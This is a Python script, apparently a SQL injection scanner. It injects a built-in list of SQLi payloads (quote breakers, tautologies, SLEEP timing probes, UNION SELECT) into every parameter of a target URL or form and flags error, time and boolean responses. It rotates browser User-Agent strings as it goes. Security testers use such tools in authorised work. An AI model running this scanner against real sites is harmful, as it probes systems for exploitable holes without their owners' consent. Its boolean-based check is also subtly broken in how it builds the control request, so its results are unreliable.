import requests
import time
import random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Configurations
REQUEST_DELAY = 1           # Delay between requests in seconds
TIMEOUT = 10                # Max wait for each request
TIME_BASED_THRESHOLD = 5    # Seconds to trigger time-based SQLi alert

USER_AGENTS = [  # Rotate headers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15"
]

SQLI_PAYLOADS = [
    "'", "\"", "'--", "\"--", "' OR '1'='1", "\" OR \"1\"=\"1",
    "' AND 1=1--", "' AND 1=2--", "' OR (SELECT SLEEP(5))--", "' UNION SELECT null--"
]

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated", "sql syntax error"
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def make_request(url, method='GET', params=None, data=None):
    try:
        headers = {'User-Agent': get_random_user_agent()}
        if method.upper() == 'GET':
            return requests.get(url, headers=headers, timeout=TIMEOUT)
        elif method.upper() == 'POST':
            return requests.post(url, data=data, headers=headers, timeout=TIMEOUT)
    except requests.RequestException:
        return None

def contains_sql_error(response_text):
    return any(err in response_text.lower() for err in SQL_ERRORS)

def is_time_based_delay(start_time):
    return (time.time() - start_time) >= TIME_BASED_THRESHOLD

def scan_sql_injection(url, method='GET', post_data=None):
    findings = []

    # Extract parameters
    if method.upper() == 'GET':
        parsed = urlparse(url)
        if not parsed.query:
            return ["⚠️ No query parameters found in URL."]
        base_url = urlunparse(parsed._replace(query=""))
        params = parse_qs(parsed.query, keep_blank_values=True)
    elif method.upper() == 'POST' and post_data:
        base_url = url
        params = post_data
    else:
        return ["⚠️ No parameters found to test."]

    for param in params:
        original_value = params[param][0] if method.upper() == 'GET' else params[param]
        
        for payload in SQLI_PAYLOADS:
            time.sleep(REQUEST_DELAY)

            # Construct test data
            test_params = params.copy()
            test_params[param] = original_value + payload

            if method.upper() == 'GET':
                test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
                start = time.time()
                response = make_request(test_url, 'GET')
            else:
                start = time.time()
                response = make_request(url, 'POST', data=test_params)

            if not response:
                findings.append(f"🚨 Request failed for {param} with payload `{payload}`")
                continue

            # Check responses
            if contains_sql_error(response.text):
                findings.append(f"❗ Error-based SQLi detected in `{param}` with payload: `{payload}`")

            if "SLEEP" in payload.upper() and is_time_based_delay(start):
                findings.append(f"⏱️ Time-based SQLi detected in `{param}` with payload: `{payload}`")

            if "AND 1=1" in payload or "AND 1=2" in payload:
                control_response = make_request(url, method, post_data if method == 'POST' else None)
                if control_response and len(response.text) != len(control_response.text):
                    findings.append(f"🔘 Boolean-based SQLi detected in `{param}` with payload: `{payload}`")

    if not findings:
        findings.append("✅ No SQL Injection vulnerabilities detected.")

    return findings
